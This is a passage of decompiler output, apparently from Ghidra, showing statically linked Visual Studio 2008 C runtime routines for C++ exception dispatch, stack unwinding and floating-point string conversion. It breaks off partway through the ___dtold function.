undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00418533:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00418512:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00418533;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00418512;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_00418649();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_00418649(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_004187a2(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_00414be1();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void Catch_All_004187d3(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420900;
  uStack_c = 0x4187f7;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00418911();
  return local_20;
}



void FUN_00418911(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_00418a0c;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_00418a0c:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    uVar6 = extraout_var;
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)__encoded_null();
      if (((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {
          pTVar1 = p_Var5->pHandlerArray[p_Var5->nCatches + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].pVFTable == '\0')) &&
             ((*(byte *)&p_Var5->pHandlerArray[p_Var5->nCatches + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        p_Var5 = p_Var5 + 1;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  int *piVar1;
  _s_FuncInfo *p_Var2;
  uchar uVar3;
  bool bVar4;
  _ptiddata p_Var5;
  int iVar6;
  _s_TryBlockMapEntry *p_Var7;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var8;
  _s_FuncInfo **pp_Var9;
  int unaff_ESI;
  _s_FuncInfo *p_Var10;
  _s_TryBlockMapEntry *unaff_EDI;
  EHRegistrationNode *pEVar11;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var10 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_00418ffd;
  p_Var8 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_00418e6a;
  iVar6 = *(int *)(param_1 + 0x14);
  if (((iVar6 != 0x19930520) && (iVar6 != 0x19930521)) && (iVar6 != 0x19930522)) goto LAB_00418e6a;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_00418e6a;
  p_Var5 = __getptd();
  if (p_Var5->_curexception != (void *)0x0) {
    p_Var5 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var5->_curexception;
    p_Var5 = __getptd();
    param_3 = (_CONTEXT *)p_Var5->_curcontext;
    iVar6 = _ValidateRead(param_1,1);
    if (iVar6 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar6 = *(int *)((int)param_1 + 0x14), iVar6 == 0x19930520 ||
         ((iVar6 == 0x19930521 || (iVar6 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec == (void *)0x0) goto LAB_00418e6a;
    p_Var5 = __getptd();
    piVar1 = (int *)p_Var5->_curexcspec;
    p_Var5 = __getptd();
    iVar6 = 0;
    p_Var5->_curexcspec = (void *)0x0;
    uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
    if (uVar3 != '\0') goto LAB_00418e6a;
    p_Var8 = (_s_FuncInfo *)0x0;
    if (0 < *piVar1) {
      do {
        bVar4 = type_info::operator==
                          (*(type_info **)((int)&p_Var8->maxState + piVar1[1]),
                           (type_info *)&std::bad_exception::RTTI_Type_Descriptor);
        if (bVar4) goto LAB_00418e3b;
        iVar6 = iVar6 + 1;
        p_Var8 = (_s_FuncInfo *)&p_Var8->pTryBlockMap;
      } while (iVar6 < *piVar1);
    }
    do {
      terminate();
LAB_00418e3b:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,s_bad_exception_00420080);
      __CxxThrowException_8(&stack0xffffffd0,&DAT_00420964);
LAB_00418e6a:
      p_Var10 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var2 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var2 == p_Var8 ||
          ((p_Var2 == (_s_FuncInfo *)0x19930521 || (p_Var2 == (_s_FuncInfo *)0x19930522)))))) {
        if (param_5->nTryBlocks != 0) {
          p_Var7 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((p_Var7->tryLow <= local_c) && (local_c <= p_Var7->tryHigh)) {
              local_10 = p_Var7->pHandlerArray;
              for (local_1c = p_Var7->nCatches; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var9 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var9; 0 < (int)local_18;
                    local_18 = (_s_FuncInfo *)((int)&local_18[-1].EHFlags + 3)) {
                  pp_Var9 = pp_Var9 + 1;
                  p_Var10 = *pp_Var9;
                  iVar6 = ___TypeMatch((byte *)local_10,(byte *)p_Var10,*(uint **)(param_1 + 0x1c));
                  if (iVar6 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                            p_Var10,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,unaff_EDI,
                            unaff_ESI,unaff_EBX,(uchar)in_stack_ffffffd0);
                    goto LAB_00418f53;
                  }
                }
                local_10 = local_10 + 1;
              }
            }
LAB_00418f53:
            p_Var7 = p_Var7 + 1;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521))
            || (param_5->pESTypeList == (ESTypeList *)0x0)) ||
           (uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI), uVar3 != '\0'))
        goto LAB_00419029;
        __getptd();
        __getptd();
        p_Var5 = __getptd();
        p_Var5->_curexception = param_1;
        p_Var5 = __getptd();
        p_Var5->_curcontext = param_3;
        pEVar11 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar11 = param_2;
        }
        _UnwindNestedFrames(pEVar11,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_004187a2(param_5->pESTypeList);
        p_Var10 = param_5;
      }
LAB_00418ffd:
      if (param_5->nTryBlocks == 0) goto LAB_00419029;
      p_Var8 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var10,param_2,param_3,param_4,param_5,local_c,param_7,param_8)
    ;
LAB_00419029:
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_00419041(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_0041a105((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_004191f5:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419235;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00419227:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00419235;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00419227;
    goto LAB_004191f5;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00419235:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_0041a105((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041929d:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004192dd;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_004192cf:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004192dd;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_004192cf;
    goto LAB_0041929d;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_004192dd:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2008 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
